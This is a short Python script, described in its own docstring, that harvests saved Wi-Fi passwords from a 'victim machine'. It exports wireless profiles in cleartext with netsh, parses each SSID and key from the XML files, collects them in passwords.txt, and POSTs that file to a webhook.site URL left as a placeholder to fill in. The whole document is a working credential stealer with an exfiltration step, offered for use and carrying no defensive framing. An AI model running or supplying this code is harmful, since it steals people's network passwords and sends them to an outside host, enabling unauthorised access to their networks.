import subprocess
import os
import sys
import requests

"""
This script collects plaintext Wi-Fi password from a victim machine
and send it over to webhook.site.
"""

# CHANGEME
url = '<webhook.site_url_here>'

# Create a file
with open('passwords.txt', 'w') as f:
    f.write("Here are the passwords:\n\n")

# Lists
wifi_files = []
wifi_name = []
wifi_password = []

# netsh wlan export profile key=clear
command = subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], capture_output=True).stdout.decode()

# Grab current directory
path = os.getcwd()

# Do the hackies
for filename in os.listdir(path):
    if filename.startswith('Wi-Fi-') and filename.endswith('.xml'):
        wifi_files.append(filename)

for file in wifi_files:
    with open(file, 'r') as f:
        name_found = False
        password_found = False
        for line in f.readlines():
            if 'name' in line and not name_found:
                stripped = line.strip()
                front = stripped[6:]
                back = front[:-7]
                wifi_name.append(back)
                name_found = True
            if 'keyMaterial' in line:
                stripped = line.strip()
                front = stripped[13:]
                back = front[:-14]
                wifi_password.append(back)
                password_found = True

        if not password_found:
            wifi_password.append('NULL')

for name, password in zip(wifi_name, wifi_password):
    sys.stdout = open('passwords.txt', 'a')
    print(f"SSID: {name}\nPassword: {password}\n\n")
    sys.stdout.close()

# Send the hackies
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)
